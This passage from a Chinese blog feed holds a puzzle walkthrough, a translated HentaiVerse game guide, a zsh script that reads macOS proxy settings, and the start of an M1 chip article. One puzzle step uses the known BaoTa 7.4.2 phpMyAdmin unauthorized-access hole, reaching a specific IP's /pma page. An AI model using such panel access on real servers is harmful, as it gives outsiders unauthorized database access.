wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 